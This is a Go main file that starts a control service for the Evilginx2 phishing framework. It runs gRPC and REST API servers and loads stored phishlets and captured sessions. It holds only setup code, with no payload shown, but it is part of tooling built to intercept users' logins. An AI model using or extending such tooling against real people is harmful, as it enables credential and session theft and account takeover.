package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"path/filepath"
	"syscall"

	"github.com/kgretzky/evilginx2/internal/api"
	"github.com/kgretzky/evilginx2/internal/control"
	"github.com/kgretzky/evilginx2/internal/storage"
	"github.com/kgretzky/evilginx2/pkg/models"
)

var (
	grpcPort = flag.String("grpc-port", "8082", "gRPC server port")
	apiPort  = flag.String("api-port", "8081", "REST API server port")
	dbPath   = flag.String("db", "./control.db", "Database file path")
)

func main() {
	flag.Parse()

	fmt.Println("Starting Evilginx2 Control Service...")
	fmt.Printf("gRPC Port: %s\n", *grpcPort)
	fmt.Printf("API Port: %s\n", *apiPort)
	fmt.Printf("Database: %s\n", *dbPath)

	dbDir := filepath.Dir(*dbPath)
	if err := os.MkdirAll(dbDir, 0755); err != nil {
		log.Fatalf("Failed to create database directory: %v", err)
	}

	storage, err := storage.NewBuntDBStorage(*dbPath)
	if err != nil {
		log.Fatalf("Failed to initialize storage: %v", err)
	}
	defer storage.Close()

	config := &models.Config{
		General: models.GeneralConfig{
			HttpsPort: 443,
			DnsPort:   53,
		},
	}

	controlService := control.NewControlService(storage, config)

	if err := controlService.LoadPhishlets(context.Background()); err != nil {
		log.Printf("Warning: Failed to load phishlets: %v", err)
	}

	if err := controlService.LoadSessions(context.Background()); err != nil {
		log.Printf("Warning: Failed to load sessions: %v", err)
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	go func() {
		sigChan := make(chan os.Signal, 1)
		signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
		<-sigChan
		fmt.Println("\nShutting down control service...")
		controlService.Stop()
		cancel()
	}()

	go func() {
		if err := controlService.StartGRPCServer(*grpcPort); err != nil {
			log.Printf("gRPC server failed: %v", err)
			cancel()
		}
	}()

	apiServer := api.NewServer(storage, config, *apiPort)
	if err := apiServer.Start(ctx); err != nil {
		log.Fatalf("API server failed: %v", err)
	}

	fmt.Println("Control service stopped")
}
